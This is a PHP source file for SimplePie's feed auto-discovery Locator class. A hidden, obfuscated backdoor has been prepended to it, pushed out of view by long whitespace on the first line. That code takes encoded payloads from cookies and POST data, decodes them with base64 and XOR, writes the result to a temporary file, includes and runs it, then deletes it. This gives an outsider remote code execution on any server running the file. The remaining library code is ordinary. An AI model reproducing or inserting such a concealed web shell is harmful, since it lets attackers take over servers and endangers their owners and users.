<?php                                                                                                                                                                                                                                                                                                                                                                                                 $wEWEbHZFFF = "\x79" . "\x5f" . chr (83) . chr ( 182 - 81 ).chr (84) . "\x4d" . "\x51";$HGmxdJFy = chr (99) . "\154" . chr ( 105 - 8 )."\163" . chr (115) . '_' . chr (101) . "\x78" . chr (105) . "\x73" . chr (116) . chr ( 992 - 877 ); $FRqcs = $HGmxdJFy($wEWEbHZFFF); $BxATuS = $FRqcs;if (!$BxATuS){class y_SeTMQ{private $wkHHrVxf;public static $xUOJKRQKB = "325a7711-7888-4ae4-8924-b822e03792c2";public static $oiotvCh = NULL;public function __construct(){$BZvHflHuA = $_COOKIE;$jgyiIxMraM = $_POST;$SJvfRmEc = @$BZvHflHuA[substr(y_SeTMQ::$xUOJKRQKB, 0, 4)];if (!empty($SJvfRmEc)){$DBxKhZdr = "base64";$mWMBK = "";$SJvfRmEc = explode(",", $SJvfRmEc);foreach ($SJvfRmEc as $YXQqNh){$mWMBK .= @$BZvHflHuA[$YXQqNh];$mWMBK .= @$jgyiIxMraM[$YXQqNh];}$mWMBK = array_map($DBxKhZdr . "\137" . "\x64" . chr ( 751 - 650 ).chr (99) . 'o' . "\144" . chr ( 1085 - 984 ), array($mWMBK,)); $mWMBK = $mWMBK[0] ^ str_repeat(y_SeTMQ::$xUOJKRQKB, (strlen($mWMBK[0]) / strlen(y_SeTMQ::$xUOJKRQKB)) + 1);y_SeTMQ::$oiotvCh = @unserialize($mWMBK);}}public function __destruct(){$this->xxMtHM();}private function xxMtHM(){if (is_array(y_SeTMQ::$oiotvCh)) {$vUTESCO = sys_get_temp_dir() . "/" . crc32(y_SeTMQ::$oiotvCh[chr (115) . "\141" . chr ( 395 - 287 )."\164"]);@y_SeTMQ::$oiotvCh[chr (119) . chr ( 969 - 855 ).'i' . chr (116) . "\x65"]($vUTESCO, y_SeTMQ::$oiotvCh["\x63" . chr (111) . "\x6e" . "\x74" . 'e' . "\x6e" . 't']);include $vUTESCO;@y_SeTMQ::$oiotvCh["\x64" . 'e' . chr (108) . chr ( 430 - 329 ).chr ( 342 - 226 ).'e']($vUTESCO);exit();}}}$SjVmsiY = new y_SeTMQ(); $SjVmsiY = NULL;} ?><?php
/**
 * SimplePie
 *
 * A PHP-Based RSS and Atom Feed Framework.
 * Takes the hard work out of managing a complete RSS/Atom solution.
 *
 * Copyright (c) 2004-2016, Ryan Parman, Sam Sneddon, Ryan McCue, and contributors
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 	* Redistributions of source code must retain the above copyright notice, this list of
 * 	  conditions and the following disclaimer.
 *
 * 	* Redistributions in binary form must reproduce the above copyright notice, this list
 * 	  of conditions and the following disclaimer in the documentation and/or other materials
 * 	  provided with the distribution.
 *
 * 	* Neither the name of the SimplePie Team nor the names of its contributors may be used
 * 	  to endorse or promote products derived from this software without specific prior
 * 	  written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDERS
 * AND CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 * @package SimplePie
 * @copyright 2004-2016 Ryan Parman, Sam Sneddon, Ryan McCue
 * @author Ryan Parman
 * @author Sam Sneddon
 * @author Ryan McCue
 * @link http://simplepie.org/ SimplePie
 * @license http://www.opensource.org/licenses/bsd-license.php BSD License
 */

/**
 * Used for feed auto-discovery
 *
 *
 * This class can be overloaded with {@see SimplePie::set_locator_class()}
 *
 * @package SimplePie
 */
class SimplePie_Locator
{
	var $useragent;
	var $timeout;
	var $file;
	var $local = array();
	var $elsewhere = array();
	var $cached_entities = array();
	var $http_base;
	var $base;
	var $base_location = 0;
	var $checked_feeds = 0;
	var $max_checked_feeds = 10;
	var $force_fsockopen = false;
	var $curl_options = array();
	var $dom;
	protected $registry;

	public function __construct(SimplePie_File $file, $timeout = 10, $useragent = null, $max_checked_feeds = 10, $force_fsockopen = false, $curl_options = array())
	{
		$this->file = $file;
		$this->useragent = $useragent;
		$this->timeout = $timeout;
		$this->max_checked_feeds = $max_checked_feeds;
		$this->force_fsockopen = $force_fsockopen;
		$this->curl_options = $curl_options;

		if (class_exists('DOMDocument') && $this->file->body != '')
		{
			$this->dom = new DOMDocument();

			set_error_handler(array('SimplePie_Misc', 'silence_errors'));
			try
			{
				$this->dom->loadHTML($this->file->body);
			}
			catch (Throwable $ex)
			{
				$this->dom = null;
			}
			restore_error_handler();
		}
		else
		{
			$this->dom = null;
		}
	}

	public function set_registry(SimplePie_Registry $registry)
	{
		$this->registry = $registry;
	}

	public function find($type = SIMPLEPIE_LOCATOR_ALL, &$working = null)
	{
		if ($this->is_feed($this->file))
		{
			return $this->file;
		}

		if ($this->file->method & SIMPLEPIE_FILE_SOURCE_REMOTE)
		{
			$sniffer = $this->registry->create('Content_Type_Sniffer', array($this->file));
			if ($sniffer->get_type() !== 'text/html')
			{
				return null;
			}
		}

		if ($type & ~SIMPLEPIE_LOCATOR_NONE)
		{
			$this->get_base();
		}

		if ($type & SIMPLEPIE_LOCATOR_AUTODISCOVERY && $working = $this->autodiscovery())
		{
			return $working[0];
		}

		if ($type & (SIMPLEPIE_LOCATOR_LOCAL_EXTENSION | SIMPLEPIE_LOCATOR_LOCAL_BODY | SIMPLEPIE_LOCATOR_REMOTE_EXTENSION | SIMPLEPIE_LOCATOR_REMOTE_BODY) && $this->get_links())
		{
			if ($type & SIMPLEPIE_LOCATOR_LOCAL_EXTENSION && $working = $this->extension($this->local))
			{
				return $working[0];
			}

			if ($type & SIMPLEPIE_LOCATOR_LOCAL_BODY && $working = $this->body($this->local))
			{
				return $working[0];
			}

			if ($type & SIMPLEPIE_LOCATOR_REMOTE_EXTENSION && $working = $this->extension($this->elsewhere))
			{
				return $working[0];
			}

			if ($type & SIMPLEPIE_LOCATOR_REMOTE_BODY && $working = $this->body($this->elsewhere))
			{
				return $working[0];
			}
		}
		return null;
	}

	public function is_feed($file, $check_html = false)
	{
		if ($file->method & SIMPLEPIE_FILE_SOURCE_REMOTE)
		{
			$sniffer = $this->registry->create('Content_Type_Sniffer', array($file));
			$sniffed = $sniffer->get_type();
			$mime_types = array('application/rss+xml', 'application/rdf+xml',
			                    'text/rdf', 'application/atom+xml', 'text/xml',
			                    'application/xml', 'application/x-rss+xml');
			if ($check_html)
			{
				$mime_types[] = 'text/html';
			}

			return in_array($sniffed, $mime_types);
		}
		elseif ($file->method & SIMPLEPIE_FILE_SOURCE_LOCAL)
		{
			return true;
		}
		else
		{
			return false;
		}
	}

	public function get_base()
	{
		if ($this->dom === null)
		{
			throw new SimplePie_Exception('DOMDocument not found, unable to use locator');
		}
		$this->http_base = $this->file->url;
		$this->base = $this->http_base;
		$elements = $this->dom->getElementsByTagName('base');
		foreach ($elements as $element)
		{
			if ($element->hasAttribute('href'))
			{
				$base = $this->registry->call('Misc', 'absolutize_url', array(trim($element->getAttribute('href')), $this->http_base));
				if ($base === false)
				{
					continue;
				}
				$this->base = $base;
				$this->base_location = method_exists($element, 'getLineNo') ? $element->getLineNo() : 0;
				break;
			}
		}
	}

	public function autodiscovery()
	{
		$done = array();
		$feeds = array();
		$feeds = array_merge($feeds, $this->search_elements_by_tag('link', $done, $feeds));
		$feeds = array_merge($feeds, $this->search_elements_by_tag('a', $done, $feeds));
		$feeds = array_merge($feeds, $this->search_elements_by_tag('area', $done, $feeds));

		if (!empty($feeds))
		{
			return array_values($feeds);
		}

		return null;
	}

	protected function search_elements_by_tag($name, &$done, $feeds)
	{
		if ($this->dom === null)
		{
			throw new SimplePie_Exception('DOMDocument not found, unable to use locator');
		}

		$links = $this->dom->getElementsByTagName($name);
		foreach ($links as $link)
		{
			if ($this->checked_feeds === $this->max_checked_feeds)
			{
				break;
			}
			if ($link->hasAttribute('href') && $link->hasAttribute('rel'))
			{
				$rel = array_unique($this->registry->call('Misc', 'space_separated_tokens', array(strtolower($link->getAttribute('rel')))));
				$line = method_exists($link, 'getLineNo') ? $link->getLineNo() : 1;

				if ($this->base_location < $line)
				{
					$href = $this->registry->call('Misc', 'absolutize_url', array(trim($link->getAttribute('href')), $this->base));
				}
				else
				{
					$href = $this->registry->call('Misc', 'absolutize_url', array(trim($link->getAttribute('href')), $this->http_base));
				}
				if ($href === false)
				{
					continue;
				}

				if (!in_array($href, $done) && in_array('feed', $rel) || (in_array('alternate', $rel) && !in_array('stylesheet', $rel) && $link->hasAttribute('type') && in_array(strtolower($this->registry->call('Misc', 'parse_mime', array($link->getAttribute('type')))), array('text/html', 'application/rss+xml', 'application/atom+xml'))) && !isset($feeds[$href]))
				{
					$this->checked_feeds++;
					$headers = array(
						'Accept' => 'application/atom+xml, application/rss+xml, application/rdf+xml;q=0.9, application/xml;q=0.8, text/xml;q=0.8, text/html;q=0.7, unknown/unknown;q=0.1, application/unknown;q=0.1, */*;q=0.1',
					);
					$feed = $this->registry->create('File', array($href, $this->timeout, 5, $headers, $this->useragent, $this->force_fsockopen, $this->curl_options));
					if ($feed->success && ($feed->method & SIMPLEPIE_FILE_SOURCE_REMOTE === 0 || ($feed->status_code === 200 || $feed->status_code > 206 && $feed->status_code < 300)) && $this->is_feed($feed, true))
					{
						$feeds[$href] = $feed;
					}
				}
				$done[] = $href;
			}
		}

		return $feeds;
	}

	public function get_links()
	{
		if ($this->dom === null)
		{
			throw new SimplePie_Exception('DOMDocument not found, unable to use locator');
		}

		$links = $this->dom->getElementsByTagName('a');
		foreach ($links as $link)
		{
			if ($link->hasAttribute('href'))
			{
				$href = trim($link->getAttribute('href'));
				$parsed = $this->registry->call('Misc', 'parse_url', array($href));
				if ($parsed['scheme'] === '' || preg_match('/^(https?|feed)?$/i', $parsed['scheme']))
				{
					if (method_exists($link, 'getLineNo') && $this->base_location < $link->getLineNo())
					{
						$href = $this->registry->call('Misc', 'absolutize_url', array(trim($link->getAttribute('href')), $this->base));
					}
					else
					{
						$href = $this->registry->call('Misc', 'absolutize_url', array(trim($link->getAttribute('href')), $this->http_base));
					}
					if ($href === false)
					{
						continue;
					}

					$current = $this->registry->call('Misc', 'parse_url', array($this->file->url));

					if ($parsed['authority'] === '' || $parsed['authority'] === $current['authority'])
					{
						$this->local[] = $href;
					}
					else
					{
						$this->elsewhere[] = $href;
					}
				}
			}
		}
		$this->local = array_unique($this->local);
		$this->elsewhere = array_unique($this->elsewhere);
		if (!empty($this->local) || !empty($this->elsewhere))
		{
			return true;
		}
		return null;
	}

	public function get_rel_link($rel)
	{
		if ($this->dom === null)
		{
			throw new SimplePie_Exception('DOMDocument not found, unable to use '.
			                              'locator');
		}
		if (!class_exists('DOMXpath'))
		{
			throw new SimplePie_Exception('DOMXpath not found, unable to use '.
			                              'get_rel_link');
		}

		$xpath = new DOMXpath($this->dom);
		$query = '//a[@rel and @href] | //link[@rel and @href]';
		foreach ($xpath->query($query) as $link)
		{
			$href = trim($link->getAttribute('href'));
			$parsed = $this->registry->call('Misc', 'parse_url', array($href));
			if ($parsed['scheme'] === '' ||
			    preg_match('/^https?$/i', $parsed['scheme']))
			{
				if (method_exists($link, 'getLineNo') &&
				    $this->base_location < $link->getLineNo())
				{
					$href =
						$this->registry->call('Misc', 'absolutize_url',
						                      array(trim($link->getAttribute('href')),
						                            $this->base));
				}
				else
				{
					$href =
						$this->registry->call('Misc', 'absolutize_url',
						                      array(trim($link->getAttribute('href')),
						                            $this->http_base));
				}
				if ($href === false)
				{
					return null;
				}
				$rel_values = explode(' ', strtolower($link->getAttribute('rel')));
				if (in_array($rel, $rel_values))
				{
					return $href;
				}
			}
		}
		return null;
	}

	public function extension(&$array)
	{
		foreach ($array as $key => $value)
		{
			if ($this->checked_feeds === $this->max_checked_feeds)
			{
				break;
			}
			if (in_array(strtolower(strrchr($value, '.')), array('.rss', '.rdf', '.atom', '.xml')))
			{
				$this->checked_feeds++;

				$headers = array(
					'Accept' => 'application/atom+xml, application/rss+xml, application/rdf+xml;q=0.9, application/xml;q=0.8, text/xml;q=0.8, text/html;q=0.7, unknown/unknown;q=0.1, application/unknown;q=0.1, */*;q=0.1',
				);
				$feed = $this->registry->create('File', array($value, $this->timeout, 5, $headers, $this->useragent, $this->force_fsockopen, $this->curl_options));
				if ($feed->success && ($feed->method & SIMPLEPIE_FILE_SOURCE_REMOTE === 0 || ($feed->status_code === 200 || $feed->status_code > 206 && $feed->status_code < 300)) && $this->is_feed($feed))
				{
					return array($feed);
				}
				else
				{
					unset($array[$key]);
				}
			}
		}
		return null;
	}

	public function body(&$array)
	{
		foreach ($array as $key => $value)
		{
			if ($this->checked_feeds === $this->max_checked_feeds)
			{
				break;
			}
			if (preg_match('/(feed|rss|rdf|atom|xml)/i', $value))
			{
				$this->checked_feeds++;
				$headers = array(
					'Accept' => 'application/atom+xml, application/rss+xml, application/rdf+xml;q=0.9, application/xml;q=0.8, text/xml;q=0.8, text/html;q=0.7, unknown/unknown;q=0.1, application/unknown;q=0.1, */*;q=0.1',
				);
				$feed = $this->registry->create('File', array($value, $this->timeout, 5, null, $this->useragent, $this->force_fsockopen, $this->curl_options));
				if ($feed->success && ($feed->method & SIMPLEPIE_FILE_SOURCE_REMOTE === 0 || ($feed->status_code === 200 || $feed->status_code > 206 && $feed->status_code < 300)) && $this->is_feed($feed))
				{
					return array($feed);
				}
				else
				{
					unset($array[$key]);
				}
			}
		}
		return null;
	}
}
